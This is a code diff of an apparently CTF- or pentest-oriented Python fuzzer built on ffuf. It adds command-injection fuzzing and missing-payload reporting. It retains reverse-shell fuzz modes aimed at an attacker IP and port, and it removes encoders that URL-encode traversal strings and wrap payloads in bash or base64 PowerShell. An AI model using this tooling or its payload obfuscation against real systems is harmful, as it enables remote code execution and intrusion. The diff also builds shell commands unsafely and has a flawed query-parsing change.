@@ -1,11 +1,9 @@
 import argparse
-import base64
 import hashlib
 import json
 import numpy as np
 import os
 import shutil
-import string
 
 from glob import glob
 from multiprocessing import Pool, cpu_count
@@ -13,15 +11,15 @@ from tqdm import tqdm
 
 from .data_classes import *
 from .util import find_common_substrings, parse_http_response
+from .encoders import *
 from .revshells import get_revshells
 from .wordlists import wordlist_strip_prefix
 
+# TODO: Cap results
 # TODO: Known path should not start with slash and should end with one (if it is a dir)
 # TODO: Allow for multiple modes simultaneously
 # TODO: Figure out how to recommend PHP Inclusion (LFI), SSTI or XSS based on reflection analysis
-# TODO: Better support for Windows revshells? In general and in revshell_encoder
 
-# TODO: Command injection
 # TODO: PHP filters (php://filter/... and data://...)
 # TODO: SQL injection
 # TODO: Remote file inclusion? Test if we can establish a connection to a file hosted on a local webserver (run a simple web server). Or does this go in the PHP Inclusion, SSTI, and XSS category?
@@ -35,45 +33,13 @@ def relpath_windows(args):
 def relpath(args):
     return relpath_linux(args) + relpath_windows(args)
 
-def url_encoder(w: str):
-    yield w
-    yield w + "%00"
-
-    if not w:
-        return
-
-    encode_dotdot = w.replace("..", "%2e%2e")
-    yield encode_dotdot
-    yield encode_dotdot + "%00"
-
-    encode_dotdot_and_slashes = encode_dotdot.replace("/", "%2f").replace("\\", "%5c")
-    yield encode_dotdot_and_slashes
-    yield encode_dotdot_and_slashes + "%00"
-
-def url_encoder_strict(w: str):
-    return "".join("%{0:0>2x}".format(ord(c)) if c not in (string.ascii_uppercase + string.ascii_lowercase + string.digits) else c for c in w)
-
-def revshell_encoder_linux(w: str):
-    yield w
-    yield url_encoder_strict(w)
-
-    bash_wrap = f"bash -c '{w.replace("'", "\\'")}'"
-    yield bash_wrap
-    yield url_encoder_strict(bash_wrap)
-
-def revshell_encoder_windows(w: str):
-    yield w
-    yield url_encoder_strict(w)
-
-    powershell_wrap = f"powershell -c '{w.replace("'", "\\'")}'"
-    yield powershell_wrap
-    yield url_encoder_strict(powershell_wrap)
-
-    powershell_encode = f"powershell -e {base64.b64encode(w.encode('utf-16le')).decode('utf-8')}"
-    yield powershell_encode
-    yield url_encoder_strict(powershell_encode)
-
 FUZZ_TYPES = {
+    "command-injection": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            "/usr/share/seclists/Fuzzing/command-injection-commix.txt"
+        ]),
+    ], encoders=[identity_encoder], required_args=[]),
+
     "lfi-general": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
             relpath,
@@ -121,12 +87,14 @@ FUZZ_TYPES = {
 
     "revshell-linux": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
+            # TODO: Try downloading the sufficient tools beforehand?
             lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
         ]),
     ], encoders=[revshell_encoder_linux], required_args=["attackbox_ip", "attackbox_port"]),
 
     "revshell-windows": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
+            # TODO: Try downloading the sufficient tools beforehand?
             lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
         ]),
     ], encoders=[revshell_encoder_windows], required_args=["attackbox_ip", "attackbox_port"]),
@@ -221,8 +189,26 @@ def display_analysis(scan_results: list, key: str, key_name: str, outlier_based 
     print(f"\033[38;5;28m----- Results for {key_name}:\033[0m")
     display_analysis_group(keyed_results, total)
 
+def display_missing_payloads_analysis(missing_payloads: dict):
+    print(f"\033[38;5;28m----- Missing payloads in results analysis:\033[0m")
+
+    for data_file, params_payloads in missing_payloads.items():
+        print(f"\033[38;5;114m--- Missing payloads for {data_file}:\033[0m")
+
+        for param, payloads_linenos in sorted(params_payloads.items(), key=lambda item: item[0]):
+            for payload, _ in sorted(payloads_linenos.items(), key=lambda item: min(item[1])):
+                print(f"- Parameter \033[38;5;24m{param}\033[0m: Missing payload \033[38;5;117m{payload}\033[0m")
+
+
+        print()
+
 def find_substrings(args):
     scan_result, targets, min_len = args
+
+    # Add individual payloads as targets as well
+    for payload in scan_result.payloads:
+        if len(payload) >= min_len:
+            targets.add(payload)
 
     _, response_body = parse_http_response(scan_result.response_raw)
     substrings = find_common_substrings(targets, response_body, min_len)
@@ -280,9 +266,8 @@ def main():
             print(f"Error: Argument `{req_arg.replace("_", "-")}` is required to perform `{args.type}` fuzzing")
             return
 
-
     response_search_targets = set()
-    with open(args.request, "rb") as f: # Check that params are given in the request file
+    with open(args.request, "rb") as f: # Check that params are given in the request file and determine substring search targets
         request_raw = f.read()
 
         for param in fuzz_type.params:
@@ -299,13 +284,14 @@ def main():
         request_body = request_body.decode()
 
         request_query = request_path.split("?")[1] if "?" in request_path else ""
-        request_params = dict([p.split("=") for p in request_query.split("&")])
+        request_params = dict([p.split("=") for p in request_query.split("&")]) if "&" in request_query else {}
 
         response_search_targets = set(request_params.values()).union(set(request_headers.values()))
-        response_search_targets = set([t.encode() for t in response_search_targets])
 
         if request_body:
             response_search_targets.add(request_body)
+
+        response_search_targets = set([t.encode() for t in response_search_targets])
     
     print(f"Will search for reflection of {response_search_targets} in response bodies. Make sure these inputs are as unique as possible!")
     
@@ -316,14 +302,30 @@ def main():
 
     for i, fuzz_args in enumerate(fuzz_type.command_args(data_dir, args)):
         data_file = os.path.join(data_dir, f"ffuf-{i}.json")
-        os.system(f"ffuf -noninteractive -t {args.threads} -mc all -request-proto {args.proto} -request {args.request}{fuzz_args} -o {data_file} -of json -od {data_dir}/ > /dev/null")
+        log_file = os.path.join(data_dir, f"ffuf-log-{i}.txt")
+        os.system(f"ffuf -noninteractive -t {args.threads} -mc all -request-proto {args.proto} -request {args.request} -timeout 30{fuzz_args} -debug-log {log_file} -o {data_file} -of json -od {data_dir}/ > /dev/null")
 
     scan_results = set()
+    missing_payloads = {}
 
     data_files = glob(os.path.join(data_dir, "ffuf-*.json"))
     for data_file in sorted(data_files):
         with open(data_file, "rb") as f:
             scan = json.load(f)
+
+            missing_payloads[data_file] = {}
+
+            for wordlist_param in scan["config"]["wordlists"]:
+                wordlist, param = wordlist_param.split(":")
+                assert param not in missing_payloads[data_file]
+
+                missing_payloads[data_file][param] = {}
+                with open(wordlist) as f:
+                    for i, line in enumerate(f.read().splitlines()):
+                        if line not in missing_payloads[data_file][param]:
+                            missing_payloads[data_file][param][line] = []
+                        
+                        missing_payloads[data_file][param][line].append(i)
 
             for result in scan["results"]:
                 payloads = result["input"]
@@ -336,12 +338,18 @@ def main():
                 scan_results.add(ScanResult(payloads=frozenset(payloads.items()), url=result["url"], status=result["status"], length=result["length"],
                                                 words=result["words"], lines=result["lines"], content_type=result["content-type"], duration=result["duration"],
                                                 response_raw=response_raw))
+
+                for param, value in payloads.items():
+                    if value in missing_payloads[data_file][param]:
+                        del missing_payloads[data_file][param][value]
     
+   
     display_analysis(scan_results, "status", "Status code")
     display_analysis(scan_results, "length", "Content length", outlier_based=True)
     display_analysis(scan_results, "words", "Content words", outlier_based=True)
     display_analysis(scan_results, "lines", "Content lines", outlier_based=True)
     display_analysis(scan_results, "duration", "Time to response (nanoseconds)", outlier_based=True)
+    display_missing_payloads_analysis(missing_payloads)
     display_response_analysis(scan_results, response_search_targets)
 
 if __name__ == "__main__":
